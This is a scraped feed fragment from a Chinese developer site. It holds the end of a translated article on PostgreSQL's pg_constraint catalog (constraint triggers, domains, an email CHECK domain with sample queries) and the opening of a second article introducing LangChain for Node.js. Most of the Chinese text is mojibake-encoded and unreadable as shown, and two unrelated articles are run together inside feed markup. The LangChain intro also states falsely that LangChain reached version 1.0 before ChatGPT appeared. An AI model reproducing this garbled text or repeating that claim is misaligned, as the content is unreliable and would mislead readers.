constraint_def <span class="hljs-operator">|</span> <span class="hljs-keyword">CHECK</span> (price <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span>::<span class="hljs-type">numeric</span>)
<span class="hljs-operator">-</span>[ RECORD <span class="hljs-number">2</span> ]<span class="hljs-comment">--+---------------------------</span>
table_name     <span class="hljs-operator">|</span> products_oct
conname        <span class="hljs-operator">|</span> products_oct_price_check
contype        <span class="hljs-operator">|</span> c
table_ref      <span class="hljs-operator">|</span> products_oct
conkey         <span class="hljs-operator">|</span> {<span class="hljs-number">1</span>}
constraint_def <span class="hljs-operator">|</span> <span class="hljs-keyword">CHECK</span> (price <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span>::<span class="hljs-type">numeric</span>)
</code></pre>
<h2 data-id="heading-3">çº¦æŸè§¦å‘å™¨ï¼ˆConstraint Triggerï¼‰</h2>
<p>åœ¨ pg_constraint ä¸­ï¼Œä½¿ç”¨ <code>CREATE CONSTRAINT TRIGGER</code> åˆ›å»ºçš„çº¦æŸè§¦å‘å™¨åŒæ ·ä¼šç”Ÿæˆè®°å½•ï¼Œå…¶ <code>contype</code> æ ‡è®°ä¸º <code>t</code>ã€‚å¸¸è§çº¦æŸå¦‚ <code>UNIQUE</code> ä¸º <code>u</code>ï¼Œ<code>CHECK</code> ä¸º <code>c</code>ã€‚</p>
<p>çº¦æŸè§¦å‘å™¨æ˜¯ä¸€ç§å°†è§¦å‘å™¨æœºåˆ¶ä¸çº¦æŸç³»ç»Ÿç»“åˆçš„ç‰¹æ®Šå½¢å¼ï¼Œä¸»è¦ç”¨äºæ•°æ®ä¸€è‡´æ€§æ ¡éªŒã€‚</p>
<h3 data-id="heading-4">å¯å»¶è¿Ÿè§¦å‘å™¨ï¼ˆDeferrable Triggersï¼‰</h3>
<p>çº¦æŸè§¦å‘å™¨é€šè¿‡ <code>CREATE CONSTRAINT TRIGGER</code> åˆ›å»ºï¼Œè¯­æ³•ä¸æ™®é€šè§¦å‘å™¨ç±»ä¼¼ï¼Œä½†æŒ‡å®š <code>CONSTRAINT</code> åç”Ÿæˆçš„æ˜¯çº¦æŸè§¦å‘å™¨ã€‚å…¶æ ¸å¿ƒåŒºåˆ«åœ¨äºï¼Œçº¦æŸè§¦å‘å™¨å¯ä»¥é€šè¿‡ <code>SET CONSTRAINTS</code> æ§åˆ¶è§¦å‘æ‰§è¡Œæ—¶æœºã€‚</p>
<p>å…¶æ‰§è¡Œæ—¶æœºå¯é€šè¿‡ <code>SET CONSTRAINTS</code> æ§åˆ¶ï¼š</p>
<ul>
<li><code>IMMEDIATE</code>ï¼šè¯­å¥ç»“æŸæ—¶æ£€æŸ¥</li>
<li><code>DEFERRED</code>ï¼šäº‹åŠ¡æäº¤æ—¶æ£€æŸ¥</li>
</ul>
<p>ä¸æ™®é€šè§¦å‘å™¨ä¸åŒï¼Œçº¦æŸè§¦å‘å™¨å…è®¸åœ¨äº‹åŠ¡çº§åˆ«å»¶è¿Ÿæ‰§è¡Œï¼Œå¹¶åœ¨è¿è¡Œæ—¶åŠ¨æ€è°ƒæ•´ã€‚</p>
<blockquote>
<p>âš ï¸ <strong>WHEN æ¡ä»¶å§‹ç»ˆç«‹å³è¯„ä¼°</strong></p>
<p>å³ä½¿è§¦å‘å™¨æœ¬èº«æ˜¯å»¶è¿Ÿæ‰§è¡Œçš„ï¼Œ<code>WHEN</code> å­å¥ä»åœ¨è¯­å¥æ‰§è¡Œæ—¶ç«‹å³åˆ¤æ–­ï¼Œç”¨äºå†³å®šæ˜¯å¦è¿›å…¥æ‰§è¡Œé˜Ÿåˆ—ã€‚</p>
</blockquote>
<h3 data-id="heading-5">AFTER è§¦å‘å™¨</h3>
<p>åœ¨åˆ›å»ºè§¦å‘å™¨æ—¶ï¼Œéœ€è¦æŒ‡å®šè§¦å‘å‡½æ•°çš„æ‰§è¡Œæ—¶æœºï¼š<code>BEFORE</code>ã€<code>AFTER</code> æˆ– <code>INSTEAD OF</code>ã€‚çº¦æŸè§¦å‘å™¨åªèƒ½å®šä¹‰ä¸º <code>AFTER</code> è§¦å‘å™¨ã€‚</p>
<p>çº¦æŸè§¦å‘å™¨å¹¶ä¸ç”¨äºæ”¹å˜æ•°æ®å¤„ç†æµç¨‹ï¼Œè€Œæ˜¯åœ¨æ•°æ®æ“ä½œå®Œæˆåè¿›è¡Œæ¡ä»¶æ ¡éªŒã€‚çº¦æŸçš„æ ¸å¿ƒç›®æ ‡æ˜¯æ•°æ®éªŒè¯ï¼Œè€Œæ™®é€šè§¦å‘å™¨é€šå¸¸ç”¨äºæ•°æ®ä¿®æ”¹ã€‚çº¦æŸè§¦å‘å™¨å±äºæ ¡éªŒæœºåˆ¶çš„ä¸€éƒ¨åˆ†ï¼Œå½“å…¶æ‰€å®ç°çš„çº¦æŸæ¡ä»¶è¢«è¿åæ—¶ï¼Œåº”å½“æŠ›å‡ºå¼‚å¸¸ã€‚</p>
<h3 data-id="heading-6">FOR EACH ROW è§¦å‘å™¨</h3>
<p>åˆ›å»ºè§¦å‘å™¨æ—¶ï¼Œè¿˜éœ€è¦æŒ‡å®šè§¦å‘ç²’åº¦ï¼š</p>
<ul>
<li><code>FOR EACH ROW</code>ï¼šå¯¹å—å½±å“çš„æ¯ä¸€è¡Œæ‰§è¡Œä¸€æ¬¡</li>
<li><code>FOR EACH STATEMENT</code>ï¼šæ¯æ¡ SQL è¯­å¥åªæ‰§è¡Œä¸€æ¬¡</li>
</ul>
<p>çº¦æŸè§¦å‘å™¨åªèƒ½å®šä¹‰ä¸º <code>FOR EACH ROW</code>ï¼Œè¿™æ˜¯å› ä¸ºçº¦æŸæ ¡éªŒä¾èµ–äºå•è¡Œæ•°æ®çš„å…·ä½“å–å€¼ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œçº¦æŸè§¦å‘å™¨ä¸æ”¯æŒ <code>OR REPLACE</code> é€‰é¡¹ï¼Œå› æ­¤åªèƒ½é€šè¿‡åˆ é™¤åé‡æ–°åˆ›å»ºçš„æ–¹å¼è¿›è¡Œä¿®æ”¹ã€‚</p>
<h3 data-id="heading-7">ä¸ºä»€ä¹ˆéœ€è¦çº¦æŸè§¦å‘å™¨</h3>
<p>åœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cybertec-postgresql.com%2Fen%2Ftriggers-to-enforce-constraints%2F" target="_blank" title="https://www.cybertec-postgresql.com/en/triggers-to-enforce-constraints/" ref="nofollow noopener noreferrer">ã€ŠTriggers to enforce constraints in PostgreSQLã€‹</a>ä¸€æ–‡ä¸­ï¼ŒLaurenz Albe æŒ‡å‡ºï¼ŒæŸäº›éœ€è¦åœ¨è¡¨çº§åˆ«å¼ºåˆ¶æ‰§è¡Œçš„è§„åˆ™ï¼Œæ— æ³•é€šè¿‡å¸¸è§„çº¦æŸç›´æ¥è¡¨è¾¾ï¼Œæ­¤æ—¶å¯å€ŸåŠ©è§¦å‘å™¨æœºåˆ¶å®ç°ã€‚æ–‡ä¸­ç»“åˆç¤ºä¾‹è¯´æ˜äº†é€‚ç”¨åœºæ™¯ï¼Œå¹¶åˆ†æäº†çº¦æŸä¸è§¦å‘å™¨åœ¨ MVCC è¡Œä¸ºä¸Šçš„å·®å¼‚ã€‚</p>
<p>åœ¨å®é™…ç³»ç»Ÿä¸­ï¼Œçº¦æŸè§¦å‘å™¨å¾ˆå°‘ç”±ç”¨æˆ·æ˜¾å¼åˆ›å»ºã€‚PostgreSQL æ›´å¤šå°†å…¶ä½œä¸ºçº¦æŸå®ç°çš„å†…éƒ¨åŸºç¡€æœºåˆ¶ä½¿ç”¨ï¼Œå°¤å…¶æ˜¯åœ¨å¤–é”®çº¦æŸä¸­ã€‚å¤–é”®ä¾èµ–ç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆçš„çº¦æŸè§¦å‘å™¨å®ç°ï¼Œè¿™ä¸€è®¾è®¡ä¹Ÿä½¿å¤–é”®èƒ½å¤Ÿæ”¯æŒ <code>DEFERRABLE</code> å’Œ <code>INITIALLY DEFERRED</code> ç­‰ç‰¹æ€§ã€‚</p>
<h2 data-id="heading-8">ä»€ä¹ˆæ˜¯åŸŸ</h2>
<p>åŸŸå¯ä»¥ç†è§£ä¸ºâ€œå¸¦çº¦æŸçš„æ•°æ®ç±»å‹â€ã€‚å®ƒåŸºäºå·²æœ‰ç±»å‹ï¼ˆå¦‚ textã€integerï¼‰ï¼Œä½†å¯ä»¥é™„åŠ  NOT NULLã€CHECK çº¦æŸæˆ–é»˜è®¤å€¼ï¼Œç”¨äºé›†ä¸­å®šä¹‰æ•°æ®è§„åˆ™ã€‚</p>
<p>ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> DOMAIN email_address <span class="hljs-keyword">AS</span> text
  <span class="hljs-keyword">CHECK</span> (<span class="hljs-keyword">VALUE</span> <span class="hljs-operator">~</span><span class="hljs-operator">*</span> <span class="hljs-string">'^[^@]+@[^@]+\.[^@]+$'</span>);

<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> users (
  id serial <span class="hljs-keyword">PRIMARY</span> KEY,
  email email_address <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>
);

<span class="hljs-comment">-- This will fail</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users(email) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'not-an-email'</span>);

<span class="hljs-comment">-- This will be successful</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users(email) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'ok@example.com'</span>);
</code></pre>
<p>ä¸Šè¿°ç¤ºä¾‹ä¸­å®šä¹‰äº†ä¸€ä¸ªåä¸º <code>email_address</code> çš„æ–°ç±»å‹ã€‚æ‰€æœ‰ä½¿ç”¨è¯¥ç±»å‹çš„åˆ—ï¼Œåœ¨æ’å…¥æˆ–æ›´æ–°æ•°æ®æ—¶éƒ½ä¼šè‡ªåŠ¨æ ¡éªŒæ­£åˆ™è¡¨è¾¾å¼ã€‚å³ä½¿è¡¨æœ¬èº«æœªæ˜¾å¼å®šä¹‰ <code>CHECK</code> çº¦æŸï¼Œéæ³•å€¼ä»ä¼šè¢«æ‹’ç»ã€‚</p>
<p>é€šå¸¸æƒ…å†µä¸‹ï¼Œçº¦æŸæ˜¯é™„åŠ åœ¨è¡¨ä¸Šçš„ï¼Œä½† PostgreSQL åŒæ ·æ”¯æŒåœ¨åŸŸä¸Šå®šä¹‰çº¦æŸã€‚ä»¥ä¸‹æŸ¥è¯¢æ¼”ç¤ºäº†å¦‚ä½•ä» <code>pg_constraint</code> ä¸­æŸ¥è¯¢å®šä¹‰åœ¨åŸŸä¸Šçš„çº¦æŸï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">SELECT</span> c.conname,
       pg_get_constraintdef(c.oid, <span class="hljs-literal">true</span>) <span class="hljs-keyword">AS</span> definition,
       t.typname <span class="hljs-keyword">AS</span> domain_name
<span class="hljs-keyword">FROM</span> pg_constraint c
<span class="hljs-keyword">JOIN</span> pg_type t <span class="hljs-keyword">ON</span> t.oid = c.contypid
<span class="hljs-keyword">WHERE</span> c.contype = <span class="hljs-comment">'c'</span>
  <span class="hljs-built_in">AND</span> c.contypid &lt;&gt; <span class="hljs-number">0</span>;
</code></pre>
<blockquote>
<p>âš¡ <strong>æŸ¥è¯¢è¦ç‚¹è¯´æ˜</strong></p>
<ul>
<li><code>pg_constraint</code> å­˜å‚¨æ‰€æœ‰ç±»å‹çš„çº¦æŸï¼ŒåŒ…æ‹¬è¡¨çº¦æŸå’ŒåŸŸçº¦æŸ</li>
<li><code>pg_type</code> å­˜å‚¨æ•°æ®ç±»å‹ä¿¡æ¯ï¼ŒåŒ…æ‹¬åŸŸ</li>
<li><code>contypid</code> è¡¨ç¤ºçº¦æŸæ‰€å±åŸŸçš„ OIDã€‚å½“ <code>contypid</code> é 0 æ—¶ï¼Œçº¦æŸé™„åŠ åœ¨åŸŸä¸Šï¼›å½“ä¸º 0 æ—¶ï¼Œçº¦æŸé™„åŠ åœ¨è¡¨ä¸Šï¼Œæ­¤æ—¶ä½¿ç”¨ <code>conrelid</code></li>
<li>é€šè¿‡ <code>JOIN pg_type t ON t.oid = c.contypid</code> è·å–åŸŸåç§°</li>
<li>åŸŸä»…æ”¯æŒ <code>CHECK</code> çº¦æŸï¼Œå› æ­¤ç­›é€‰æ¡ä»¶ä¸º <code>c.contype = 'c'</code></li>
<li><code>pg_get_constraintdef()</code> ç”¨äºè·å–çº¦æŸå®šä¹‰æ–‡æœ¬ï¼Œä¸ <code>CREATE DOMAIN</code> ä¸­çš„å®šä¹‰ä¸€è‡´</li>
</ul>
</blockquote>
<p>æŸ¥è¯¢ç»“æœå¦‚ä¸‹ï¼Œå±•ç¤ºäº†çº¦æŸåç§°ã€å®šä¹‰å†…å®¹ä»¥åŠæ‰€å±åŸŸï¼š</p>
<pre><code class="hljs language-ini" lang="ini">conname            | definition                            | domain_name
-------------------+---------------------------------------+-------------
email_address_check|CHECK (VALUE ~* '^<span class="hljs-section">[^@]</span>+@<span class="hljs-section">[^@]</span>+\.<span class="hljs-section">[^@]</span>+$')| email_address
</code></pre>
<h2 data-id="heading-9">æ€»ç»“</h2>
<p>é€šè¿‡ <code>pg_constraint</code> ç³»ç»Ÿç›®å½•ï¼Œå¯ä»¥ç³»ç»Ÿç†è§£ PostgreSQL ä¸­å„ç±»çº¦æŸçš„å†…éƒ¨è¡¨ç¤ºæ–¹å¼ã€‚æ— è®ºæ˜¯åˆ—çº¦æŸã€è¡¨çº¦æŸã€çº¦æŸè§¦å‘å™¨ï¼Œè¿˜æ˜¯åŸŸä¸Šçš„çº¦æŸï¼Œæœ¬è´¨ä¸Šéƒ½é€šè¿‡åŒä¸€å¥—æœºåˆ¶è¿›è¡Œç®¡ç†ï¼Œè¿™æ˜¯ PostgreSQL çº¦æŸä½“ç³»è®¾è®¡ä¸Šçš„å…³é”®ç‰¹ç‚¹ã€‚</p>
<p>åŸæ–‡é“¾æ¥ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fxata.io%2Fblog%2Fconstraints-in-postgres" target="_blank" title="https://xata.io/blog/constraints-in-postgres" ref="nofollow noopener noreferrer">xata.io/blog/constrâ€¦</a></p>
<p>ä½œè€…ï¼šGulcin Yildirim Jelinek</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LangChainï¼šAI åº”ç”¨å¼€å‘æ¡†æ¶çš„æ·±åº¦è§£æä¸å®è·µæŒ‡å—]]></title>    <link>https://juejin.cn/post/7589082912588054571</link>    <guid>https://juejin.cn/post/7589082912588054571</guid>    <pubDate>2025-12-29T09:07:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589082912588054571" data-draft-id="7589082912588038187" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LangChainï¼šAI åº”ç”¨å¼€å‘æ¡†æ¶çš„æ·±åº¦è§£æä¸å®è·µæŒ‡å—"/> <meta itemprop="keywords" content="å‰ç«¯,LangChain,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2025-12-29T09:07:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¤¾æçš„ä¸‹æ°´é“èŸ‘è‚"/> <meta itemprop="url" content="https://juejin.cn/user/423789937565536"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LangChainï¼šAI åº”ç”¨å¼€å‘æ¡†æ¶çš„æ·±åº¦è§£æä¸å®è·µæŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/423789937565536/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¤¾æçš„ä¸‹æ°´é“èŸ‘è‚
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:07:38.000Z" title="Mon Dec 29 2025 09:07:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨äººå·¥æ™ºèƒ½é¢†åŸŸçš„æµ©ç€šæ˜Ÿç©ºä¸­ï¼Œ2022 å¹´ ChatGPT çš„æ¨ªç©ºå‡ºä¸–æ— ç–‘æ˜¯æœ€ä¸ºè€€çœ¼çš„ä¸€é¢—æ–°æ˜Ÿã€‚å®ƒåŸºäº Transformer æ¶æ„ï¼Œåœ¨ AIGCï¼ˆäººå·¥æ™ºèƒ½ç”Ÿæˆå†…å®¹ï¼‰é¢†åŸŸå¼•å‘äº†ä¸€åœºé©å‘½ã€‚ç„¶è€Œï¼Œæ—©åœ¨ ChatGPT å¤§æ”¾å¼‚å½©ä¹‹å‰ï¼ŒLangChain å°±å·²æ‚„ç„¶æ¨å‡º 1.0+ ç‰ˆæœ¬ï¼Œä½œä¸ºä¸€æ¬¾ç‹¬å…·åŒ å¿ƒçš„ AI åº”ç”¨å¼€å‘æ¡†æ¶ï¼Œæ­£é€æ¸æˆä¸ºå¼€å‘è€…ä»¬æ„å»ºå„ç±» AI åº”ç”¨çš„å¾—åŠ›åŠ©æ‰‹ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€LangChain æ ¸å¿ƒæ¦‚å¿µè§£è¯»</h2>
<h3 data-id="heading-1">ï¼ˆä¸€ï¼‰â€œLang + Chainâ€ èƒŒåçš„æ·±æ„</h3>
<p>LangChain çš„å‘½åè•´å«ç€å…¶æ ¸å¿ƒè®¾è®¡ç†å¿µï¼Œâ€œLangâ€ ä»£è¡¨è¯­è¨€ï¼Œèšç„¦äºå¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰ã€‚LLM ä½œä¸ºå½“å‰äººå·¥æ™ºèƒ½æŠ€æœ¯çš„æ ¸å¿ƒé©±åŠ¨åŠ›ï¼Œå…·å¤‡å¼ºå¤§çš„è¯­è¨€ç†è§£ä¸ç”Ÿæˆèƒ½åŠ›ï¼Œæ˜¯ä¼—å¤šæ™ºèƒ½åº”ç”¨çš„åŸºçŸ³ã€‚è€Œ â€œChainâ€ åˆ™è±¡å¾ç€è¿æ¥ä¸æ•´åˆï¼Œç±»ä¼¼äº n8nã€coze ä»¥åŠ Node.js ç¯å¢ƒä¸‹å°†ä¸åŒåŠŸèƒ½æ¨¡å—æœ‰æœºä¸²è”çš„è¿‡ç¨‹ã€‚åœ¨ LangChain ä¸­ï¼Œâ€œChainâ€ é€šè¿‡å·§å¦™åœ°è¿æ¥å„ç§ä¸è¯­è¨€å¤„ç†ç›¸å…³çš„ç»„ä»¶ï¼Œå®ç°äº†ä»ç®€å•æ–‡æœ¬æ“ä½œåˆ°å¤æ‚ä»»åŠ¡è§£å†³çš„åŠŸèƒ½æ‹“å±•ã€‚ä¾‹å¦‚ï¼Œå®ƒå¯ä»¥å°†æ–‡æ¡£åŠ è½½ã€æ–‡æœ¬åˆ†å‰²ã€åµŒå…¥ç”Ÿæˆã€æ£€ç´¢ä»¥åŠæœ€ç»ˆçš„è¯­è¨€æ¨¡å‹è°ƒç”¨ç­‰å¤šä¸ªç¯èŠ‚è¿æ¥æˆä¸€ä¸ªå®Œæ•´çš„å·¥ä½œæµï¼Œä»¥è§£å†³ç‰¹å®šçš„è‡ªç„¶è¯­è¨€å¤„ç†ä»»åŠ¡ã€‚</p>
<h3 data-id="heading-2">ï¼ˆäºŒï¼‰åŸºäº Node å¼€å‘ä¸ ESM çš„åº”ç”¨</h3>
<p>LangChain åŸºäº Node.js è¿›è¡Œå¼€å‘ï¼Œå……åˆ†åˆ©ç”¨äº† Node.js ä¸°å¯Œçš„ç”Ÿæ€ç³»ç»Ÿå’Œé«˜æ•ˆçš„äº‹ä»¶é©±åŠ¨æ¶æ„ã€‚Node.js æ‹¥æœ‰åºå¤§çš„å¼€æºç¤¾åŒºï¼Œè¿™ä½¿å¾— LangChain èƒ½å¤Ÿè½»æ¾é›†æˆå„ç§ç¬¬ä¸‰æ–¹åº“å’Œå·¥å…·ï¼Œä»è€Œä¸°å¯Œè‡ªèº«çš„åŠŸèƒ½ã€‚åŒæ—¶ï¼Œé‡‡ç”¨ ESMï¼ˆECMAScript Modulesï¼‰è§„èŒƒè¿›è¡Œæ¨¡å—ç®¡ç†ï¼Œåœ¨Â <code>package.json</code>Â æ–‡ä»¶ä¸­å°†Â <code>type</code>Â è®¾ç½®ä¸ºÂ <code>module</code>ï¼Œé¡¹ç›®ä¾¿å¯æ— ç¼ä½¿ç”¨ ESM è¯­æ³•è¿›è¡Œæ¨¡å—çš„å¯¼å…¥ä¸å¯¼å‡ºã€‚è¿™ç§è®¾ç½®ä¸ä»…ä½¿ä»£ç ç»“æ„æ›´åŠ æ¸…æ™°ã€æ¨¡å—åŒ–ï¼Œè¿˜ç¬¦åˆç°ä»£ JavaScript å¼€å‘çš„è¶‹åŠ¿ï¼Œä¾¿äºå¼€å‘è€…è¿›è¡Œä»£ç çš„ç»„ç»‡ã€ç»´æŠ¤å’Œæ‰©å±•ã€‚ä¾‹å¦‚ï¼Œåœ¨å¤§å‹é¡¹ç›®ä¸­ï¼Œä¸åŒåŠŸèƒ½æ¨¡å—å¯ä»¥åˆ†åˆ«å°è£…åœ¨å„è‡ªçš„ ESM æ¨¡å—ä¸­ï¼Œé€šè¿‡æ˜ç¡®çš„å¯¼å…¥å’Œå¯¼å‡ºè¯­å¥è¿›è¡Œäº¤äº’ï¼Œæé«˜ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</p>
<h3 data-id="heading-3">ï¼ˆä¸‰ï¼‰LLM çš„å¯æ’æ‹”æ€§ä¸é€‚é…å™¨æ¨¡å¼</h3>
<ol>
<li><strong>ä¾èµ–å®‰è£…ä¸å¯æ’æ‹”ç‰¹æ€§</strong>ï¼šé€šè¿‡æ‰§è¡ŒÂ <code>npm install langchain @langchain/deepseek</code>Â å‘½ä»¤ï¼Œå¼€å‘è€…èƒ½å¤Ÿä¾¿æ·åœ°å¼•å…¥ LangChain åŠå…¶é’ˆå¯¹ DeepSeek æ¨¡å‹çš„ç›¸å…³ä¾èµ–ã€‚åœ¨å¿«é€Ÿå‘å±•çš„ LLM é¢†åŸŸï¼Œæ¨¡å‹çš„æ€§ä»·æ¯”å’Œæ›´æ–°æ¢ä»£é¢‘ç‡æé«˜ã€‚LangChain çš„å¯æ’æ‹”è®¾è®¡èµ‹äºˆå¼€å‘è€…æå¤§çš„çµæ´»æ€§ï¼Œä½¿å…¶èƒ½å¤Ÿæ ¹æ®å®é™…éœ€æ±‚ï¼Œå¦‚æ€§èƒ½è¦æ±‚ã€æˆæœ¬é¢„ç®—ã€ç‰¹å®šä»»åŠ¡é€‚é…æ€§ç­‰ï¼Œè½»æ¾æ›´æ¢ä¸åŒçš„ LLMã€‚ä¾‹å¦‚ï¼Œå½“å¸‚åœºä¸Šå‡ºç°æ€§èƒ½æ›´ä¼˜ã€æˆæœ¬æ›´ä½çš„æ–°æ¨¡å‹æ—¶ï¼Œå¼€å‘è€…åªéœ€ç®€å•è°ƒæ•´ä¾èµ–ï¼Œå³å¯å°†å…¶é›†æˆåˆ°é¡¹ç›®ä¸­ï¼Œè€Œæ— éœ€å¯¹æ•´ä½“ä»£ç ç»“æ„è¿›è¡Œå¤§è§„æ¨¡ä¿®æ”¹ã€‚</li>
